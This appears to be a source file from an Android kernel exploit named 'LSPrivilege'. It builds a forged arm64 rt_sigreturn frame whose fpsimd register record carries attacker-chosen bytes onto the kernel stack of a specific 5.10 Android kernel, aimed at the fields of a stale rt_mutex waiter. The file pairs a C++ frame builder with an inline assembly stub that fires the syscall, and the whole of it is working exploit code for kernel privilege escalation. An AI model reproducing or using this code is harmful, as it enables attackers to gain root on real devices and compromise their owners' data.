/*
 * LSPrivilege — sigreturn fpsimd stack stamp implementation.
 *
 * Frame layout (5.10.101-android12-9-gece0cc04d1a5, from disassembly of
 * __arm64_sys_rt_sigreturn / restore_sigframe / parse_user_sigframe /
 * restore_fpsimd_context):
 *
 *   sf+0x000 siginfo          (never read on this path)
 *   sf+0x080 uc_flags, sf+0x088 uc_link
 *   sf+0x090 uc_stack {ss_sp, ss_flags, ss_size}  -> SS_DISABLE skips checks
 *   sf+0x0a8 uc_sigmask (8B)  applied by set_current_blocked before the copy
 *   sf+0x130 fault_address    (not read)
 *   sf+0x138 x0..x30 (31x8), sf+0x230 sp, sf+0x238 pc, sf+0x240 pstate
 *   sf+0x250 record chain (16-byte aligned offsets, END = {0,0}):
 *            fpsimd {u32 magic 0x46508001, u32 size 0x210,
 *                    u32 fpsr, u32 fpcr, u8 vregs[512]}
 *
 * restore_fpsimd_context copies vregs (512B) to its stack buffer at +0,
 * fpsr to +0x200 and fpcr to +0x204 (the buffer is user_fpsimd_state).
 * With the chain rt_sigreturn(0x50) -> restore_sigframe(0x60) ->
 * restore_fpsimd_context(0x250) the buffer low end sits 768 bytes below the
 * syscall-entry sp, which covers the stale rt_mutex waiter at depth 448 for
 * waiter_off = 768-448 = 320: task/lock at buffer+368/376 = vregs[23].
 */
#include "route/sigreturn_stamp.h"

#include <signal.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <cstring>

namespace lsprivilege::route {
    namespace {
        constexpr uint32_t kFpsimdMagic = 0x46508001u;
        constexpr uint32_t kFpsimdSize = 0x210u;
        constexpr uint32_t kSsDisable = 2;

        constexpr size_t kUcStack = 0x90;
        constexpr size_t kUcSigmask = 0xa8;
        constexpr size_t kRecords = 0x250;

        void put_u32(uint8_t *p, uint32_t v) {
            p[0] = static_cast<uint8_t>(v);
            p[1] = static_cast<uint8_t>(v >> 8);
            p[2] = static_cast<uint8_t>(v >> 16);
            p[3] = static_cast<uint8_t>(v >> 24);
        }

        void put_u64(uint8_t *p, uint64_t v) {
            for (unsigned i = 0; i < 8; i++) p[i] = static_cast<uint8_t>(v >> (8 * i));
        }

        uint32_t get_u32(const unsigned char *p) {
            return static_cast<uint32_t>(p[0]) | (static_cast<uint32_t>(p[1]) << 8) |
                   (static_cast<uint32_t>(p[2]) << 16) |
                   (static_cast<uint32_t>(p[3]) << 24);
        }
    } // namespace

    uint64_t current_blocked_sigmask() {
#if defined(__ANDROID__)
        uint64_t mask = 0;
        /* A NULL set argument leaves the mask unchanged and just reads it. */
        if (syscall(SYS_rt_sigprocmask, SIG_UNBLOCK, nullptr, &mask,
                    sizeof(mask)) != 0) {
            mask = ~0ULL;
        }
        return mask;
#else
        /* Host builds: same read through pthread_sigmask (a null set leaves
         * the mask unchanged); only the low 64 bits are architecturally
         * significant on arm64. */
        sigset_t set;
        uint64_t mask = 0;
        if (pthread_sigmask(SIG_BLOCK, nullptr, &set) == 0)
            memcpy(&mask, &set, sizeof(mask));
        return mask;
#endif
    }

    void build_sigreturn_stamp_frame(uint8_t *frame, const unsigned char *stamp,
                                     size_t stamp_size, uint64_t blocked_mask) {
        if (!frame || !stamp || stamp_size < kSigStampDeliveredBytes) return;
        memset(frame, 0, kSigStampFrameBytes);

        /* uc_stack.ss_flags = SS_DISABLE: restore_sigframe zeroes the slot and
         * skips the ss_sp range check. */
        put_u32(frame + kUcStack + 8, kSsDisable);
        put_u64(frame + kUcSigmask, blocked_mask);

        /* fpsimd record header (magic/size are validated exactly). */
        put_u32(frame + kRecords + 0, kFpsimdMagic);
        put_u32(frame + kRecords + 4, kFpsimdSize);
        /* stamp = user_fpsimd_state {vregs[32], fpsr, fpcr} -> record =
         * user_fpsimd_context {head, fpsr, fpcr, vregs[32]}. */
        put_u32(frame + kRecords + 8, get_u32(stamp + 512));
        put_u32(frame + kRecords + 12, get_u32(stamp + 516));
        memcpy(frame + kRecords + 16, stamp, 512);
        /* END record at +0x210 (16-aligned): {magic=0, size=0} already zero. */
    }
} // namespace lsprivilege::route

/* Register-level fire stub. Dumps x0..x30 into the frame's GPR slots first so
 * the restore gives the caller back its own callee-saved state, then points
 * sp at the frame and invokes rt_sigreturn (139). The kernel restores pc from
 * the frame (our continuation label) and x30 (the caller's return address),
 * so the continuation is a plain `ret`. x18 (shadow call stack on Android)
 * travels through the same save/restore like every other GPR. */
#if defined(__ANDROID__)
__asm__(
    ".text\n"
    ".align 2\n"
    ".globl lsprivilege_fire_sigreturn_stamp\n"
    ".type lsprivilege_fire_sigreturn_stamp, %function\n"
    "lsprivilege_fire_sigreturn_stamp:\n"
    "    stp x0,  x1,  [x0, #0x138]\n"
    "    stp x2,  x3,  [x0, #0x148]\n"
    "    stp x4,  x5,  [x0, #0x158]\n"
    "    stp x6,  x7,  [x0, #0x168]\n"
    "    stp x8,  x9,  [x0, #0x178]\n"
    "    stp x10, x11, [x0, #0x188]\n"
    "    stp x12, x13, [x0, #0x198]\n"
    "    stp x14, x15, [x0, #0x1a8]\n"
    "    stp x16, x17, [x0, #0x1b8]\n"
    "    stp x18, x19, [x0, #0x1c8]\n"
    "    stp x20, x21, [x0, #0x1d8]\n"
    "    stp x22, x23, [x0, #0x1e8]\n"
    "    stp x24, x25, [x0, #0x1f8]\n"
    "    add x1, x0, #0x200\n"
    "    stp x26, x27, [x1, #8]\n"
    "    stp x28, x29, [x1, #0x18]\n"
    "    str x30,      [x1, #0x28]\n"
    "    mov x2, sp\n"
    "    str x2,       [x1, #0x30]\n"
    "    adr x2, .Llsprivilege_sigstamp_cont\n"
    "    str x2,       [x1, #0x38]\n"
    "    str xzr,      [x0, #0x138]\n"
    "    mov x8, #139\n"
    "    mov sp, x0\n"
    "    svc #0\n"
    "    brk #0x1\n"
    ".Llsprivilege_sigstamp_cont:\n"
    "    ret\n"
    ".size lsprivilege_fire_sigreturn_stamp, .-lsprivilege_fire_sigreturn_stamp\n");
#else
/* Host builds never fire the stamp (the route refuses without geometry); the
 * stub keeps the link whole for host-side tests of the frame builder. */
extern "C" void lsprivilege_fire_sigreturn_stamp(void *) {}
#endif
